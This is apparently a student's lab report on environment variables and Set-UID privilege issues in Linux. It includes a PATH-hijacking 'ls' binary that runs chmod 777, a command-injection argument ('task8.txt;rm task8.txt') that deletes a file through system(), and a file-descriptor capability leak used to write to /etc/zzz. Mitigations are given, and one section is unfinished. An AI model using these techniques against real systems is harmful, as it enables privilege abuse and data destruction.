TASK 1:

To simplify the visualization, we'll only pay attention to the PWD enrionment variable, for which running the printenv and env commands return:

   $ printenv PWD

   returns: "/home/seed/task1/Labsetup"

   $ env | grep PWD

   returns: "PWD=/home/seed/task1/Labsetup
   OLDPWD=/home/seed" (since I had changed to the Labsetup directory using "cd task1/Labsetup")

Using now export, we can create a variable, such as : "$ export VARIABLE='var'", and using printenv and env to check the new variable we get:

   $ printenv VARIABLE

   returns: "var"

   $ env | grep VARIABLE

   returns: "VARIABLE=var"

If we now use "$ unset VARIABLE", both "$ printenv VARIABLE" and "$ env | grep VARIABLE" don't return anything.

TASK 2:

step 3 - Since the two files are identical when compared with the diff command, this means that the child process inherited the same environment as the parent process at the moment of the fork() call.

TASK 3:

step 3 - The new program receives its environment variables from the third argument passed to execve().
When environ is passed, the new program inherits the environment of the process that executed it.
When NULL is passed instead, the new program starts with an empty environment, so /usr/bin/env prints nothing.

TASK 5:

step 3 - When I exported ANY_NAME=this_name (and other variables) and then ran the Set-UID program, the program printed ANY_NAME=this_name along with PATH, HOME, USER, and other variables.
The SET_UID program the calling process's environment, but the system's secure execution policy prevents untrusted environment variables such as LD_LIBRARY_PATH from influencing privileged execution.

TASK 6:

After compiling the program and following the steps from the previous task to change its owner to root, and make it a Set-UID program with the following instructions:

   $ gcc mynewset.c -o mynewset (name of the program)

   $ sudo chown root mynewset (changing the exacutable output of the program to root)
   
   $ sudo chmod 4755 mynewset (making it a SET-UID program)

A new directory needs to be created. Here I chose the name malicious, and put it in front of PATH:

   $ mkdir -p ~/malicious

   $ export PATH="$HOME/malicious:$PATH"

And created a file than will receive the root priprogram called ls.c inside said directory with the code:

"#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main()
{
   printf("malicious");
	system("chmod 777 /home/seed/malicious/file");
	return 0;
}"

ls.c then needs to be compiled:

   $ gcc ~/malicious/ls.c -o ~/malicious/ls

???

TASK 8:

step 1 - Like the previous task, we'll compile the program catall.c, change its owner to root, and make it a Set-UID program with the following instructions:

   $ gcc catall.c -o catall

   $ sudo chown root catall

   $ sudo chmod 4755 catall

We now need to create a file for us to read inside, for which I'll choose the name "task8.txt", with the following command:

   $ echo "Bob can't change this." > task8.txt

Which can be read using:

   $ ./catall "task8.txt"

However, because of the use of the system() function, this file can be easily removed by using the same call, but adding the remove command afterwards:

   $ ./catall "task8.txt;rm task8.txt"

Which will first read the file as asked, and will then remove it, making any call of said file return "task8.txt: No such file or directory"

This is one of the vulnerabilities of the function system().

step 2 - After commenting the system() statement and uncommenting the execve() statement, we now need to compile the program catall.c again, change its owner to root, and make it a Set-UID program with the following instructions:

   $ gcc catall.c -o catallnew

   $ sudo chown root catallnew

   $ sudo chmod 4755 catallnew

Again, we'll create another file with the same name and content as before using the same command:

   $ echo "Bob can't change this." > task8.txt

For which, our new catall program can still read using the command:

   $ ./catallnew "task8.txt"

   However, this time around, using the same command we exploited before to remove the file:

   $ ./catallnew "task8.txt;rm task8.txt"

We won't be able to execute the command. The file won't be read and it won't removed either, receiving the following message:
"'task8.txt;rm task8.txt': No such file or directory"

This shows that the function execve() only allows the file to be read, fixing the vulnerability used for the previous attack when the program still used the function system().

TASK9

We'll start things off by creating the /etc/zzz file that will be used in the code, with root ownership and permissions. To do that, we'll use the following commands:

   $ sudo touch /etc/zzz

   $ sudo chown root:root /etc/zzz (changing not only the owner but the user group)
   
   $ sudo chmod 0644 /etc/zzz

Now we need to compile the program cap_leak.c, change its owner to root, and make it a Set-UID/GID program with the following instructions:

   $ gcc cap_leak.c -o capleak

   $ sudo chown root:root capleak

   $ sudo chmod +s capleak

Now running the program with "./capleak" it returns "fd is 3". This means that lowest unused file descriptor is 3. This file descriptor remains open across execve() and is inherited by the new shell. Since the opening happened with root and Set-UID permissions, it allows access to the file even if the privelege was dropped using setuid(getuid()), which can be exploited.

We are now able to easily write in the "/etc/zzz" using the echo command:

   $ echo "I'm writing inside this file" >&3 (using the file descriptor 3)

Which using "$ cat /etc/zzz" returns: "I'm writing inside this file", the exact message we had written inside, meaning the file was indeed modified.

However, there are several ways to mitigate this exploit, such as:

1.Closing /etc/zzz on execution by using O_CLOEXEC in the open() command in the following line: "fd = open("/etc/zzz", O_RDWR | O_APPEND | O_CLOEXEC);"

2.If the file doesn't need provileged access, dropping the root privileges before calling open() by using setresuid/setresgid and setgroups(0,NULL): 

   setgroups(0, NULL);

   if (setresgid(gid, gid, gid) == -1);

   if (setresuid(uid, uid, uid) == -1);

3.Closing fd with the command "close(fd);" before the execution of the execve() command.

We should now try testing one of this methods to see if the capability leak was solved. We'll use the first method as an example:

Changing the cap_leak.c file open statement to the one used for the first method, "fd = open("/etc/zzz", O_RDWR | O_APPEND | O_CLOEXEC);" we need to recompile and give the program the same permissions from before:

   $ gcc cap_leak.c -o capleak

   $ sudo chown root:root capleak

   $ sudo chmod +s capleak

We should also check if the /etc/zzz file still exists with the same privileges, for which would can use the command "$ ls -l /etc/zzz". Running this command in the terminal returns the following:

"-rw-r--r-- 1 root root 29 Oct 13 16:00 /etc/zzz" Showing that the file indeed still exists and has the same privileges as before.

Additionally, using the command "$ cat /etc/zzz" we can see the contents of the file are the same as well, since the message we wrote before is still desplayed: "I'm writing inside this file".

Running the program with "$ ./capleak", it still returns "fd is 3", which means that lowest unused file descriptor is still 3, so the exploit from before should've still work if the program wasn't changed (if /etc/zzz wasn't closed on execution). So we'll do the same thing as before to test it:

   $ echo "This should not be written" >&3

Which now returns: "zsh: 3: bad file descriptor" because fd 3 was closed on execve() due to O_CLOEXEC. We can still check the content of the file using "$ sudo cat /etc/zzz" and it still shows the same thing as before, "I'm writing inside this file", meaning that "This should not be written" wasn't able to be written into the file and that the capability leak from before was fixed.



